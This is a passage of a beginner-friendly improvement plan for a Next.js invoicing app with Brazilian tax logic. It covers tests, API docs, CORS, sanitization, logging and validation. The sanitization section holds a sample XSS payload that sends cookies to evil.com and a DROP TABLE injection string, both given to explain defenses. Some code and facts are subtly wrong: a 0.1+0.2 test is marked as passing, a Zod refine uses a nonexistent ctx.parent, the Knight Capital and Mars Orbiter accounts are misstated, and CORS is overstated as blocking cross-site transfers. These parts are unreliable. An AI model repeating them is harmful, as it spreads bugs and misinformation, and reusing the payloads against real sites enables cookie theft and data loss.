**🎓 Why This Matters:**
Tests are like a safety net for circus performers. You can try new tricks confidently because if you fall, the net catches you!

**What are unit tests?**

Tests are small programs that check if your code works correctly:

```typescript
// Your code:
function add(a, b) {
  return a + b;
}

// Test for your code:
test("add function works", () => {
  expect(add(2, 3)).toBe(5); // ✓ Pass
  expect(add(-1, 1)).toBe(0); // ✓ Pass
  expect(add(0.1, 0.2)).toBe(0.3); // ✓ Pass
});
```

**Why write tests?**

**Scenario without tests:**

1. You write tax calculation code
2. Works great! ✓
3. Three months later, you add a new feature
4. Accidentally break tax calculation
5. Ship to production
6. Customers complain invoices are wrong
7. Your company loses money
8. Boss is angry 😠

**Scenario with tests:**

1. You write tax calculation code
2. Write tests to verify it works
3. Three months later, add new feature
4. Run tests before shipping
5. Test fails: "Tax calculation broke!"
6. You fix it BEFORE customers see it
7. Ship confidently knowing nothing broke
8. Boss is happy 😊

**Types of things to test:**

1. **Business Logic** (CRITICAL for your app!)

```typescript
test("INSS tax calculated correctly", () => {
  const result = calculateINSS({
    value: 10000, // R$100
    material: 3000, // R$30
    inssRate: 5,
  });
  expect(result).toBe(350); // R$3.50
  // If formula changes accidentally, test catches it!
});

test("taxes under R$10 not charged", () => {
  const result = calculateCS({
    value: 10000,
    csRate: 0.05, // Would be R$0.50
  });
  expect(result).toBe(0); // Should be zero!
});
```

2. **Edge Cases** (weird situations that break code)

```typescript
test("handles zero values", () => {
  expect(calculateTax(0)).toBe(0); // Don't crash!
});

test("handles negative values", () => {
  expect(() => calculateTax(-100)).toThrow("Value cannot be negative");
});

test("handles very large numbers", () => {
  expect(calculateTax(999999999)).toBeLessThan(Infinity);
});
```

3. **Data Validation**

```typescript
test("rejects invalid CNPJ format", () => {
  expect(() => createSupplier({ cnpj: "abc123" })).toThrow(
    "Invalid CNPJ format"
  );
});

test("rejects negative invoice values", () => {
  expect(() => createInvoice({ value: -100 })).toThrow(
    "Value must be positive"
  );
});
```

**Benefits of testing:**

✅ **Catch bugs early** - Fix before customers see them  
✅ **Refactor confidently** - Change code without fear  
✅ **Documentation** - Tests show HOW to use your code  
✅ **Sleep better** - Know your code works  
✅ **Faster development** - Less time debugging production issues

**The testing pyramid:**

```
      /\
     /  \    E2E Tests (Few)
    /----\   "Test entire app works"
   /      \
  /--------\ Integration Tests (Some)
 /          \ "Test services work together"
/------------\
|            | Unit Tests (Many)
|            | "Test each function works"
--------------
```

**Real-world disaster - Knight Capital (2012):**

- Trading company
- No tests for deployment system
- Deployed wrong code version
- Lost $440 million in 45 minutes
- Company bankrupt

If they had tests, the bug would have been caught before deployment!

**Common beginner objections:**

❌ **"Tests take too long to write"**

- Writing test: 5 minutes
- Debugging production bug at 2 AM: 3 hours
- Tests save time!

❌ **"My code is simple, doesn't need tests"**

- Tax calculation seems simple
- But INSS deduction bug shows it's tricky
- Simple code can have complex bugs

❌ **"I'll add tests later"**

- "Later" never comes
- Code without tests becomes harder to test over time
- Start with tests = easier in long run

**How to get started:**

1. **Test the money stuff first!**

   - Tax calculations (most critical)
   - Invoice creation
   - Payment calculations

2. **Test what breaks most**

   - Look at bug reports
   - Write test for each bug
   - Bug never comes back!

3. **Test incrementally**
   - Don't try to test everything at once
   - Add tests as you write new features
   - Gradually increase coverage

**What is "code coverage"?**

Percentage of your code that tests run:

- 0% coverage = No tests
- 50% coverage = Half of code is tested
- 80% coverage = Most code is tested (good target!)
- 100% coverage = Every line tested (overkill for most projects)

**Action Items:**

- [ ] Choose testing framework (Jest or Vitest)
- [ ] Install testing dependencies
- [ ] Write tests for services layer
  - [ ] `invoice.service.ts` (especially tax calculations)
  - [ ] `user.service.ts`
- [ ] Write tests for storage layer
- [ ] Write API integration tests
- [ ] Add test database configuration
- [ ] Set up CI/CD test automation
- [ ] Achieve >80% code coverage

**Test Priority:**

1. Tax calculation logic (critical business logic)
2. Authentication/authorization
3. Data validation
4. Database operations

---

### 14. Add API Documentation

**Priority:** P2  
**Effort:** 1-2 days  
**Files Affected:**

- New: `API.md` or use OpenAPI/Swagger
- `package.json` (if using Swagger)

**🎓 Why This Matters:**
API documentation is like an instruction manual for your API. Without it, other developers (or future you!) have to guess how things work.

**The problem - No documentation:**

Frontend developer needs to create an invoice:

```
Developer: "How do I create an invoice?"
You: "Call POST /api/invoices"
Developer: "What data do I send?"
You: "Um... let me check the code..."
Developer: "What format?"
You: "Let me check again..."
Developer: "What do I get back?"
You: "...I need to look at the code..."
```

This wastes hours! You keep getting interrupted, developer keeps waiting.

**With documentation:**

Developer opens API docs:

```markdown
## Create Invoice

POST /api/invoices

### Request Body:

{
"supplierCnpj": "12.345.678/0001-90",
"serviceCode": "SRV-001",
"value": 10000, // cents (R$100.00)
"material": 3000 // cents (R$30.00)
}

### Response (201 Created):

{
"id": 123,
"netAmountCents": 9500,
"createdAt": "2025-10-22T10:30:00Z"
}

### Errors:

- 400: Invalid data format
- 404: Supplier or service not found
- 500: Server error
```

Developer has all info needed! No questions, no interruptions!

**Benefits of documentation:**

✅ **Saves time** - Developers find answers themselves  
✅ **Fewer bugs** - Clear requirements = correct implementation  
✅ **Easier onboarding** - New team members get up to speed faster  
✅ **Better testing** - QA knows what to test  
✅ **Professional image** - Shows you care about quality

**What to document:**

1. **Endpoints**

   - URL path
   - HTTP method (GET, POST, PATCH, DELETE)
   - What it does

2. **Authentication**

   - How to get a token
   - Where to put it (header, cookie, etc.)
   - What permissions are needed

3. **Request format**

   - Required fields
   - Optional fields
   - Data types
   - Validation rules
   - Example request

4. **Response format**

   - Success response structure
   - Example response
   - Field descriptions

5. **Error cases**

   - Possible error codes
   - What each error means
   - How to fix them
   - Example error response

6. **Examples**
   - Common use cases
   - Code samples (curl, JavaScript, Python)
   - Copy-paste-ready examples

**Documentation formats:**

**Option 1 - Simple Markdown (easiest):**

```markdown
# API Documentation

## Invoices

### GET /api/invoices

Returns all invoices...
```

✅ Easy to write  
✅ Lives in your repo  
❌ Not interactive  
❌ Manual updates

**Option 2 - OpenAPI/Swagger (professional):**

```yaml
paths:
  /api/invoices:
    post:
      summary: Create invoice
      requestBody:
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/Invoice"
```

✅ Interactive playground  
✅ Auto-generates from code  
✅ Industry standard  
❌ Steeper learning curve

**Option 3 - Postman Collection (practical):**

- Import into Postman
- Click to test API
- Share with team

✅ Easy to test  
✅ Good for manual testing  
❌ Another tool to maintain

**Real-world example:**

Stripe (payment company) has AMAZING documentation:

- Every endpoint documented
- Live examples you can run
- Shows code in 7 languages
- Result? Developers love it, company worth billions

Compare to APIs with bad docs:

- Developers avoid them
- Constant support questions
- Negative reviews
- Lost business

**Documentation = Marketing:**

Good docs make developers WANT to use your API!

**Common beginner mistakes:**

❌ **"Code is self-documenting"**

- Code shows HOW it works (implementation)
- Docs show WHAT it does (purpose)
- You need both!

❌ **"I'll write docs after coding"**

- Coding done → Move to next project
- Docs never written
- Write docs WHILE coding!

❌ **"Docs get outdated"**

- Yes, if you don't update them
- Solution: Update docs with code changes
- Review docs in code reviews

❌ **"Too much work"**

- 1 hour documenting saves 100 hours answering questions
- Think of it as investing, not wasting time

**How to keep docs updated:**

1. **Add to pull request checklist**

   - [ ] Code written
   - [ ] Tests added
   - [ ] Docs updated ← Don't forget!

2. **Generate from code**

   - Use tools that auto-generate docs from code comments
   - Docs stay in sync automatically

3. **Review regularly**
   - Every release, check if docs are accurate
   - Better to update quarterly than never

**Quick documentation template:**

````markdown
# [Endpoint Name]

**URL:** POST /api/endpoint
**Auth Required:** Yes/No
**Permissions:** Admin/User

## Description

What this endpoint does and why you'd use it.

## Request

```json
{
  "field": "value"
}
```
````

## Success Response (200 OK)

```json
{
  "data": { ... }
}
```

## Error Responses

- **400 Bad Request:** Invalid input
- **401 Unauthorized:** Not logged in
- **403 Forbidden:** No permission
- **404 Not Found:** Resource doesn't exist

## Example

```bash
curl -X POST https://api.example.com/endpoint \
  -H "Authorization: Bearer token" \
  -d '{"field": "value"}'
```

````

**Action Items:**
- [ ] Document all API endpoints
- [ ] Add request/response examples
- [ ] Document authentication requirements
- [ ] Add error response documentation
- [ ] Consider using OpenAPI/Swagger
- [ ] Generate interactive API documentation
- [ ] Keep documentation in sync with code

---

## 🟢 NICE TO HAVE - Enhancements

### 15. Add CORS Configuration
**Priority:** P3
**Effort:** 30 minutes
**Files Affected:**
- `next.config.ts`

**🎓 Why This Matters:**
CORS is the browser's security guard that says "Is this website allowed to talk to that API?" Without proper CORS setup, your frontend can't access your backend!

**What is CORS?**

CORS = Cross-Origin Resource Sharing

**Origin** = Protocol + Domain + Port
- `http://localhost:3000` ← Origin 1
- `https://myapp.com` ← Origin 2 (different!)

**The browser rule:**
By default, `myapp.com` can't call APIs on `api.other-site.com`

Why? Security! Prevents evil.com from stealing your data.

**Example - Why CORS exists:**

1. You log into `bank.com`
2. Bank sets a cookie with your session
3. You visit `evil.com` (while still logged into bank)
4. Evil site tries: `fetch('bank.com/api/transfer-money')`
5. **CORS blocks it!** ← Saves your money!

Without CORS protection:
- Evil site steals your money ✗
- Evil site reads your emails ✗
- Evil site posts as you on social media ✗

**The problem for YOUR app:**

Your setup:
- Backend API: `https://api.myapp.com`
- Frontend: `https://myapp.com`

Different domains = browser blocks requests!

```javascript
// Frontend code:
const response = await fetch('https://api.myapp.com/invoices');

// Browser says:
// ❌ "Error: CORS policy blocked this request"
// ❌ Frontend sees: Failed to fetch
// ❌ User sees: Blank page or error message
````

**The solution - Configure CORS:**

Tell browser: "Yes, myapp.com is allowed to call api.myapp.com"

```typescript
// next.config.ts
headers: [
  {
    source: "/api/:path*",
    headers: [
      {
        key: "Access-Control-Allow-Origin",
        value: "https://myapp.com", // ← Allow this domain
      },
      {
        key: "Access-Control-Allow-Methods",
        value: "GET,POST,PATCH,DELETE", // ← Allow these methods
      },
    ],
  },
];
```

Now browser says: "OK, this is allowed" ✓

**CORS headers explained:**

1. **Access-Control-Allow-Origin**

   - Who can call this API?
   - `*` = Everyone (dangerous!)
   - `https://myapp.com` = Only this site (safe!)

2. **Access-Control-Allow-Methods**

   - What HTTP methods are allowed?
   - `GET,POST,DELETE` = These are OK
   - PUT not listed? Browser blocks it!

3. **Access-Control-Allow-Headers**

   - What headers can frontend send?
   - `Authorization, Content-Type` = Common ones
   - Custom headers need to be listed!

4. **Access-Control-Allow-Credentials**
   - Can frontend send cookies?
   - `true` = Cookies allowed (for authentication)
   - `false` = No cookies

**Common CORS scenarios:**

**Development (different ports):**

```
Frontend: http://localhost:3000
Backend:  http://localhost:3001
Problem: Different ports = CORS error!
Solution: Allow localhost:3000 in CORS
```

**Production (same domain):**

```
Frontend: https://myapp.com
Backend:  https://myapp.com/api
Problem: None! Same origin ✓
```

**Production (different domains):**

```
Frontend: https://app.mysite.com
Backend:  https://api.mysite.com
Problem: Different subdomains = CORS error!
Solution: Allow app.mysite.com in CORS
```

**Security best practices:**

✅ **DO:**

- List specific allowed origins
- Only allow methods you use
- Use environment variables for origins
- Different config for dev/prod

```typescript
{
  value: process.env.ALLOWED_ORIGIN || "http://localhost:3000";
}
```

❌ **DON'T:**

- Use `*` in production (allows anyone!)
- Allow all methods (security risk)
- Hardcode URLs (breaks in different environments)

**The danger of `Access-Control-Allow-Origin: *`:**

```typescript
// BAD - Open to everyone!
{ key: "Access-Control-Allow-Origin", value: "*" }
```

Now ANY website can call your API:

- `evil.com` can read your data
- `competitor.com` can scrape your app
- Bots can hammer your endpoints

**Real-world example:**

A company set CORS to `*` for "easy testing". Forgot to change it in production. Competitor scraped their entire database and launched a rival service. Company lost 40% market share.

**How to test CORS:**

1. **Without CORS configured:**

```javascript
fetch("http://localhost:3001/api/invoices");
// ❌ Console: "CORS policy: No 'Access-Control-Allow-Origin' header"
```

2. **With CORS configured:**

```javascript
fetch("http://localhost:3001/api/invoices");
// ✓ Response: { data: [...] }
```

3. **Check in browser DevTools:**

- Open Network tab
- Make request
- Click request
- Look at Response Headers
- Should see: `Access-Control-Allow-Origin: http://localhost:3000`

**Common beginner confusion:**

❌ **"I'm getting CORS errors!"**

- CORS is a BROWSER security feature
- Errors only happen in browsers
- Postman/curl don't have CORS (they're not browsers!)
- That's why API works in Postman but not in React app

❌ **"I'll disable CORS to fix it"**

- You can't disable CORS (it's in the browser)
- You can only CONFIGURE it properly
- Don't fight CORS, work with it!

**Quick debugging:**

If getting CORS errors:

1. Check browser console for exact error
2. Check if backend sends CORS headers (Network tab)
3. Verify origin matches allowed origin exactly
4. Make sure method (GET/POST) is allowed
5. Check if credentials setting matches

**Action Items:**

- [ ] Add CORS headers configuration
- [ ] Configure allowed origins
- [ ] Set allowed methods
- [ ] Add environment-based configuration
- [ ] Test CORS from different origins

---

### 16. Add Input Sanitization

**Priority:** P3  
**Effort:** 2-3 hours  
**Files Affected:**

- New: `src/lib/sanitization.ts`
- All API routes

**🎓 Why This Matters:**
Input sanitization is like washing vegetables before eating them. Users can send "dirty" data (accidentally or maliciously) - you need to clean it before using it!

**What is input sanitization?**

Taking user input and removing dangerous parts:

```typescript
// User sends:
"<script>alert('HACKED!')</script>Hello";

// After sanitization:
"Hello"; // Removed the dangerous script!
```

**The danger - Trusting user input:**

**Rule #1 of security: NEVER TRUST USER INPUT!**

Why? Users (or hackers) can send:

- Malicious code
- SQL commands
- Excessive data
- Invalid formats
- Sneaky characters

**Attack Type 1 - Cross-Site Scripting (XSS):**

Hacker creates supplier with malicious name:

```typescript
POST /api/suppliers
{
  "name": "<script>
    fetch('evil.com/steal?cookie=' + document.cookie)
  </script>"
}
```

What happens:

1. You save this name in database
2. Admin views supplier list
3. Browser executes the script!
4. Script steals admin's session cookie
5. Hacker logs in as admin

**Without sanitization:**

- Hacker owns your app ✗

**With sanitization:**

```typescript
// Input: "<script>alert('bad')</script>ABC Inc"
// Output: "ABC Inc"  // Script removed!
```

**Attack Type 2 - SQL Injection:**

(Note: You use parameterized queries with Drizzle, so you're protected! But good to understand)

```typescript
// Hacker sends:
{
  "name": "ABC'; DROP TABLE invoices; --"
}

// Bad code (DON'T DO THIS):
db.query(`INSERT INTO suppliers VALUES ('${name}')`);

// Becomes:
INSERT INTO suppliers VALUES ('ABC'; DROP TABLE invoices; --')
// ↑ Deletes your entire invoices table!
```

**With proper sanitization/parameterization:**

```typescript
// Drizzle automatically escapes:
db.insert(tableSuppliers).values({ name: "ABC'; DROP..." });

// Becomes:
INSERT INTO suppliers VALUES ('ABC''; DROP TABLE invoices; --')
// ↑ Stored as literal string, not executed ✓
```

**Attack Type 3 - Excessive Data:**

```typescript
// Hacker sends 10 MB of text:
{
  "name": "A".repeat(10000000)  // 10 million characters
}
```

What happens:

- ❌ Database crashes (name field overflows)
- ❌ Server runs out of memory
- ❌ API becomes slow for everyone

**With sanitization:**

```typescript
function sanitizeName(input: string): string {
  return input.slice(0, 100); // Max 100 characters
}
```

**What to sanitize:**

1. **HTML/Script tags**

   ```typescript
   // Remove: <script>, <iframe>, <object>
   sanitize("<script>bad</script>Good"); // → "Good"
   ```

2. **Special characters in names**

   ```typescript
   // Allow: Letters, numbers, spaces, basic punctuation
   // Remove: ;'"><|&
   sanitize("ABC';DROP--"); // → "ABCDROP"
   ```

3. **Excessive whitespace**

   ```typescript
   sanitize("  Too     many   spaces  ");
   // → "Too many spaces"
   ```

4. **Length limits**

   ```typescript
   // Truncate to reasonable length
   sanitize("A".repeat(10000)); // → "AAA...AAA" (100 chars)
   ```

5. **Email format**

   ```typescript
   // Verify it looks like an email
   sanitize("not-an-email"); // → throws error or returns ""
   sanitize("user@test.com"); // → "user@test.com" ✓
   ```

6. **Phone numbers**
   ```typescript
   // Keep only numbers and basic formatting
   sanitize("(11) 98765-4321"); // → "11987654321"
   sanitize("call me maybe"); // → throws error
   ```

**Sanitization vs Validation - What's the difference?**

**Validation** = "Is this data correct?"

- Check if email has @ symbol
- Check if number is positive
- **Rejects** bad data

**Sanitization** = "Make this data safe"

- Remove script tags
- Trim whitespace
- **Fixes** data

Both are important!

```typescript
// Validation (rejects):
if (!email.includes("@")) {
  throw new Error("Invalid email");
}

// Sanitization (fixes):
const cleanEmail = email.trim().toLowerCase();
```

**Where to sanitize:**

✅ **Before saving to database**

- Clean data before storage

✅ **Before displaying to users**

- Prevent XSS when showing data

✅ **Before using in calculations**

- Ensure numbers are actually numbers

**Real-world disaster - MySpace Worm (2005):**

1. User created profile with malicious script
2. MySpace didn't sanitize input
3. Anyone viewing that profile got infected
4. Script copied itself to their profile
5. Spread to 1 million users in 20 hours!
6. Entire site taken offline

If MySpace had sanitized HTML input, this wouldn't have happened.

**Common beginner mistakes:**

❌ **"My users aren't hackers"**

- Only takes ONE malicious user
- Automated bots constantly probe for vulnerabilities
- Even accidents can cause damage

❌ **"Validation is enough"**

- Validation can be bypassed (client-side)
- Sanitization is defense-in-depth
- Use BOTH

❌ **"I'll sanitize when displaying"**

- What if you forget in one place?
- Better to clean at entry point
- Dirty data in database = time bomb

**Libraries that help:**

```typescript
// DOMPurify - Clean HTML
import DOMPurify from "dompurify";
const clean = DOMPurify.sanitize(dirtyHTML);

// validator - Common sanitizers
import validator from "validator";
const email = validator.normalizeEmail("User@Example.COM");
// → "user@example.com"

// Built-in String methods
const safe = input.trim().slice(0, 100);
```

**Action Items:**

- [ ] Add HTML sanitization for text inputs
- [ ] Add SQL injection prevention (using parameterized queries)
- [ ] Add XSS prevention
- [ ] Sanitize file uploads (if added later)
- [ ] Add input length limits

---

### 17. Add Logging Infrastructure

**Priority:** P3  
**Effort:** 1 day  
**Files Affected:**

- New: `src/lib/logger.ts`
- All files (gradual adoption)

**🎓 Why This Matters:**
Logging is like a black box recorder in an airplane. When something crashes, logs tell you what happened and why!

**What's wrong with console.log?**

Your current code:

```typescript
console.log("Creating invoice");
console.error("Error:", error);
```

Problems:

- ❌ No timestamps (when did this happen?)
- ❌ No severity levels (is this important or just info?)
- ❌ No context (which user? which request?)
- ❌ Disappears when server restarts
- ❌ Hard to search through
- ❌ Can't filter or analyze

**Real scenario without proper logging:**

```
Boss: "App crashed at 3 AM, users can't log in. What happened?"
You: *checks console* "Uh... server restarted, logs are gone"
Boss: "Can you figure it out?"
You: "Not without logs... no idea what caused it"
Boss: 😠
```

**With proper logging:**

```
Boss: "App crashed at 3 AM, what happened?"
You: *searches logs for 3 AM*
[2025-10-22 03:14:52 ERROR] Database connection failed: timeout
[2025-10-22 03:14:53 ERROR] Cannot connect to PostgreSQL at 192.168.1.50
You: "Database server went down. Checking with infrastructure team."
Boss: "Great, thanks!" 😊
```

**Log levels explained:**

Like a volume knob for information:

1. **DEBUG** (Loudest - everything)

   ```typescript
   logger.debug("User clicked button", { userId: 123, button: "submit" });
   ```

   - Use for: Development troubleshooting
   - Production: Usually turned off (too noisy)

2. **INFO** (Normal operations)

   ```typescript
   logger.info("Invoice created", { invoiceId: 456, amount: 10000 });
   ```

   - Use for: Normal business events
   - Production: Keep these on

3. **WARN** (Something unusual but not broken)

   ```typescript
   logger.warn("Tax calculation near limit", { value: 999, limit: 1000 });
   ```

   - Use for: Potential problems
   - Production: Review these regularly

4. **ERROR** (Something broke but app still runs)

   ```typescript
   logger.error("Failed to send email", { error: err.message, userId: 789 });
   ```

   - Use for: Failures that need attention
   - Production: Alert developers

5. **FATAL** (App is crashing)
   ```typescript
   logger.fatal("Database unreachable, shutting down");
   ```
   - Use for: Critical failures
   - Production: Wake up developers at 3 AM!

**What to log:**

✅ **DO log:**

- User actions (created invoice, deleted user)
- Errors and exceptions
- Performance metrics (query took 5s)
- Authentication events (login, logout, failed attempts)
- Business events (payment received, invoice sent)

❌ **DON'T log:**

- Passwords (NEVER!)
- Credit card numbers
- Personal data (unless necessary for debugging)
- Full request/response bodies (too much data)

**Structured logging vs text logging:**

**Bad (text logging):**

```typescript
console.log("User " + userId + " created invoice " + invoiceId);
// Output: "User 123 created invoice 456"
```

Problems:

- Hard to search for specific user
- Can't filter by invoice
- Can't analyze patterns

**Good (structured logging):**

```typescript
logger.info('Invoice created', {
  userId: 123,
  invoiceId: 456,
  amount: 10000,
  timestamp: '2025-10-22T10:30:00Z'
});

// Output (JSON):
{
  "level": "INFO",
  "message": "Invoice created",
  "userId": 123,
  "invoiceId": 456,
  "amount": 10000,
  "timestamp": "2025-10-22T10:30:00Z"
}
```

Benefits:

- ✓ Search for all actions by user 123
- ✓ Filter invoices over R$100
- ✓ Analyze patterns (how many invoices per day?)
- ✓ Import into analytics tools

**Context matters:**

Bad log:

```typescript
logger.error("Failed to create");
```

- Failed to create WHAT?
- WHY did it fail?
- WHO tried to create it?

Good log:

```typescript
logger.error("Failed to create invoice", {
  error: err.message,
  userId: req.user.id,
  supplierCnpj: data.supplierCnpj,
  serviceCode: data.serviceCode,
  requestId: req.id,
});
```

Now you can debug the issue!

**Log rotation - Don't fill up your hard drive:**

Without rotation:

```
Day 1: app.log (1 MB)
Day 30: app.log (30 MB)
Day 365: app.log (365 MB)
Day 1000: app.log (1 GB) → Server crashes, disk full!
```

With rotation:

```
Current: app.log (1 MB)
Yesterday: app-2025-10-21.log (1 MB)
Last week: app-2025-10-15.log (1 MB)
Old logs: Compressed or deleted
```

**Logging in different environments:**

**Development:**

```typescript
// Console output, all levels, pretty format
logger.debug("Starting server...");
// → [DEBUG] 10:30:00 Starting server...
```

**Production:**

```typescript
// File output, INFO and above, JSON format
logger.info("Server started", { port: 3000 });
// → {"level":"INFO","time":"2025-10-22T10:30:00Z","message":"Server started","port":3000}
```

**Searching logs:**

With proper logging, you can find issues fast:

```bash
# Find all errors today
grep "ERROR" app.log

# Find all actions by user 123
grep "userId\":123" app.log

# Find slow queries (over 1 second)
grep "duration" app.log | grep -E "[1-9][0-9]{3,}"

# Count invoices created today
grep "Invoice created" app.log | wc -l
```

**Real-world benefits:**

1. **Debugging production issues**

   - User: "It's broken!"
   - You: _checks logs_ "You sent invalid CNPJ format"
   - Fix in minutes instead of hours

2. **Performance monitoring**

   - Log query times
   - Notice when database gets slow
   - Optimize before users complain

3. **Security**

   - See failed login attempts
   - Detect brute force attacks
   - Trace hacker's actions after breach

4. **Business analytics**

   - How many invoices created per day?
   - Which services are most popular?
   - When is peak usage time?

5. **Compliance**
   - Regulators: "Show us access logs"
   - You: "Here are all database queries for user X"

**Common beginner mistakes:**

❌ **Logging too much**

```typescript
logger.debug("Starting function");
logger.debug("Checking user");
logger.debug("User valid");
logger.debug("Querying database");
logger.debug("Got results");
logger.debug("Returning...");
// Too noisy! Can't find important info
```

❌ **Logging too little**

```typescript
// Only logs errors
// When debugging, need to add logs and redeploy
// Should log normal flow too
```

❌ **Logging sensitive data**

```typescript
logger.info("User login", {
  password: "123456", // ← NEVER LOG PASSWORDS!
});
```

✓ **Just right:**

```typescript
logger.info("Invoice created", { invoiceId, userId, amount });
logger.warn("Suspicious activity", { userId, ipAddress, attemptCount });
logger.error("Database error", { error: err.message, query: "SELECT..." });
```

**Recommended logger libraries:**

- **Winston** - Most popular, very flexible
- **Pino** - Fastest, minimal overhead
- **Bunyan** - Good structured logging

All better than console.log!

**Action Items:**

- [ ] Choose logging library (Winston, Pino, etc.)
- [ ] Configure log levels
- [ ] Add structured logging
- [ ] Set up log rotation
- [ ] Configure remote log aggregation (optional)
- [ ] Add performance logging
- [ ] Replace console.log with proper logger

---

### 18. Add Data Validation Rules

**Priority:** P3  
**Effort:** 3-4 hours  
**Files Affected:**

- All schema files in `src/db/schemas/`

**🎓 Why This Matters:**
Validation rules are like a bouncer checking IDs at a club. They make sure data "looks right" before it enters your database.

**Why validate?**

**Garbage in = Garbage out**

Without validation:

```typescript
// Someone creates supplier:
{
  "cnpj": "banana",
  "name": "",
  "email": "not-an-email"
}
```

What happens:

- ✗ Saves to database (because no validation)
- ✗ Later, try to send email → crashes (invalid email)
- ✗ Try to look up supplier by CNPJ → fails (CNPJ is garbage)
- ✗ Reports are wrong (empty names show as blank)

With validation:

```typescript
// Zod schema:
cnpj: z.string().regex(/^\d{2}\.\d{3}\.\d{3}\/\d{4}-\d{2}$/),
name: z.string().min(1).max(100),
email: z.string().email()

// Someone tries invalid data:
// ❌ Rejected: "CNPJ must match format XX.XXX.XXX/XXXX-XX"
// ❌ Rejected: "Name cannot be empty"
// ❌ Rejected: "Email format is invalid"
```

**Types of validation:**

**1. Format validation** (does it look right?)

```typescript
// CNPJ must be: 12.345.678/0001-90
cnpj: z.string().regex(/^\d{2}\.\d{3}\.\d{3}\/\d{4}-\d{2}$/);

// Email must have @
email: z.string().email();

// Phone: (11) 98765-4321
phone: z.string().regex(/^\(\d{2}\) \d{4,5}-\d{4}$/);
```

**2. Range validation** (is the value reasonable?)

```typescript
// Invoice value must be positive and realistic
value: z.number()
  .positive("Value must be positive")
  .max(100000000, "Value too large (max R$1,000,000)");

// Material can't be more than total value
material: z.number()
  .nonnegative("Material cannot be negative")
  .refine((val, ctx) => {
    return val <= ctx.parent.value;
  }, "Material cannot exceed total value");

// Tax rate must be between 0% and 100%
inss: z.number().min(0).max(100);
```

**3. Length validation** (not too short, not too long)

```typescript
// Name must have something, but not a novel
name: z.string().min(1, "Name is required").max(100, "Name too long");

// Description is optional but limited
description: z.string().max(500, "Description max 500 characters").optional();
```

**4. Custom business rules**

```typescript
// Can't create invoice in the future
invoiceDate: z.date().refine((date) => date <= new Date(), {
  message: "Invoice date cannot be in the future",
});

// Service code must start with "SRV-"
serviceCode: z.string().refine((code) => code.startsWith("SRV-"), {
  message: "Service code must start with SRV-",
});
```

**Why CNPJ validation matters:**

CNPJ is Brazilian business tax ID: `12.345.678/0001-90`

Without validation, users might send:

- `12345678000190` (missing formatting)
- `12.345.678/0001-9` (wrong length)
- `00.000.000/0000-00` (invalid number)
- `ABC.DEF.GHI/JKLM-NO` (not numeric)

Then your code breaks when:

- Trying to send to government API (rejects invalid format)
- Looking up supplier (can't find due to format mismatch)
- Displaying on reports (looks unprofessional)

**With proper validation:**

```typescript
const cnpjSchema = z
  .string()
  .regex(
    /^\d{2}\.\d{3}\.\d{3}\/\d{4}-\d{2}$/,
    "CNPJ must be in format: XX.XXX.XXX/XXXX-XX"
  )
  .refine(validateCnpjChecksum, {
    message: "Invalid CNPJ checksum",
  });

function validateCnpjChecksum(cnpj: string): boolean {
  // Remove formatting
  const numbers = cnpj.replace(/\D/g, "");

  // Calculate check digits (Brazilian algorithm)
  // ... algorithm here ...

  return calculatedChecksum === actualChecksum;
}
```

This catches:

- ✓ Wrong format
- ✓ Invalid check digits (typos)
- ✓ Fake CNPJs

**Email validation - Beyond just "@":**

Basic validation (not enough):

```typescript
email: z.string().email();
// Accepts: "user@domain"  ← Invalid! Missing .com
```

Better validation:

```typescript
email: z.string()
  .email()
  .refine((email) => {
    // Must have domain extension
    return /\.\w{2,}$/.test(email);
  }, "Email must have valid domain")
  .refine((email) => {
    // Prevent common typos
    const invalidDomains = ["gmial.com", "yahooo.com"];
    return !invalidDomains.some((d) => email.endsWith(d));
  }, "Did you mean gmail.com or yahoo.com?");
```

**Validation error messages - Be helpful!**

❌ Bad messages:

```typescript
z.string().min(1); // Error: "Expected string"
// User thinks: "What's wrong?? I sent a string!"
```

✅ Good messages:

```typescript
z.string()
  .min(1, "Name is required")
  .max(100, "Name must be 100 characters or less");
// User knows exactly what to fix!
```

**Where to validate:**

**Layer 1 - Client-side (frontend)**

```typescript
// React form
if (!email.includes("@")) {
  setError("Email must contain @");
  return;
}
```

✓ Fast feedback for user  
✗ Can be bypassed (user can edit JavaScript)

**Layer 2 - API layer (your backend)**

```typescript
// API route
const data = createInvoiceSchema.parse(body);
```

✓ Can't be bypassed  
✓ Protects database

**Layer 3 - Database constraints**

```typescript
// Drizzle schema
email: text("email").notNull().unique();
```

✓ Last line of defense  
✓ Enforced even if you forget validation in code

**Use ALL three layers!**

**Real-world example - The Mars Climate Orbiter:**

NASA lost a $125 million spacecraft because one team used metric (meters) and another used imperial (feet). The validation layer didn't catch the mismatch. The orbiter crashed into Mars.

Lesson: Validate your units! Validate everything!

**Common validation mistakes:**

❌ **Only validating frontend**

```typescript
// Frontend checks email format
// But hacker bypasses frontend, sends to API directly
// Invalid email in database
```

❌ **No custom error messages**

```typescript
z.string(); // Error: "Invalid type"
// User confused: "What type do you want??"
```

❌ **Validating too late**

```typescript
// Save to database first
// Then validate
// Oops, bad data already saved!
```

❌ **Not validating relationships**

```typescript
// Create invoice with supplierCnpj: "12345"
// But supplier doesn't exist!
// Should validate supplier exists first
```

**Validation makes your app professional:**

Without validation:

- User enters bad data → Confusing errors
- "System error, try again later"
- User frustrated, leaves

With validation:

- User enters bad data → Helpful message
- "CNPJ must be in format XX.XXX.XXX/XXXX-XX"
- User fixes it, succeeds ✓

**Action Items:**

- [ ] Add CNPJ format validation
- [ ] Add email format validation
- [ ] Add phone number validation
- [ ] Add date range validations
- [ ] Add custom error messages
- [ ] Add min/max constraints
- [ ] Document validation rules

---

### 19. Performance Optimization

**Priority:** P3  
**Effort:** Ongoing

**🎓 Why This Matters:**
Performance is about making your app FAST. Users expect pages to load in under 2 seconds - any slower and they leave!

**The performance equation:**

Slow app = Users leave = Lost business

Studies show:

- 1 second delay = 7% fewer conversions
- 3 second load time = 40% of users leave
- Amazon: Every 100ms delay costs 1% of sales

**Common performance problems:**

**Problem 1 - N+1 Queries (The Silent Killer)**

What is N+1? Doing one query, then N more queries in a loop:

```typescript
// Bad code (N+1):
const invoices = await db.select().from(tableInvoices); // 1 query

for (const invoice of invoices) {
  // N queries (one per invoice!)
  const supplier = await db
    .select()
    .from(tableSuppliers)
    .where(eq(tableSuppliers.cnpj, invoice.supplierCnpj));

  const service = await db
    .select()
    .from(tableServices)
    .where(eq(tableServices.code, invoice.serviceCode));
}

// Total: 1 + (100 * 2) = 201 queries for 100 invoices! 😱
```

Impact:

- 100 invoices = 201 database queries
